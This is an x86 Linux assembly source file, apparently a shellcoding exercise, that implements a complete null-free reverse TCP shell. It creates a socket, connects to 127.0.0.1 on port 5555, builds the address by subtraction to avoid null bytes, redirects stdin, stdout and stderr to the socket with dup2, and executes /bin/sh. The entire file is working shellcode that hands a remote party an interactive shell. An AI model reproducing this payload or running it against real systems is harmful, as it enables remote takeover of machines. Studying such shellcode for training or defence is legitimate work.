global_start

section .text
_start:

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
	
	; SYS CALL #1 = socket()
	
	mov ax, 0x167
	mov bl, 0x02
	mov cl, 0x01
	
	int 0x80
	mov edi, eax

	; SYS CALL #2 = connect()

	xor eax, eax
	mov ax, 0x16a 
	mov ebx, edi
	xor ecx, ecx
	push ecx		; pushing our 8 bytes of zero as per: home.iitk.ac.in/~chebrolu/scourse/slides/sockets-tutorial.pdf
				      
	
	mov ecx, 0x02010180     ; moving 2.1.1.128 into ecx
	sub ecx, 0x01010101     ; subtracting 1.1.1.1 from ecx
	
	push ecx		      ; putting 1.0.0.127 onto the stack (null free)
	push word 0xb315	      ; port 5555
	push word 0x02		      ; AF_INET
	
	mov ecx, esp
	mov dl, 16
	
	int 0x80

	; SYSCALL #3 = dup2()

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	mov cl, 0x3
	
	loop_dup2:
	mov al, 0x3f
	mov ebx, edi
	dec cl
	int 0x80
	
	jnz loop_dup2

	; SYSCALL #6 = execve()
 
  	xor eax, eax
	push eax
	push 0x68732f6e
	push 0x69622f2f
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 0x0b

  	int 0x80
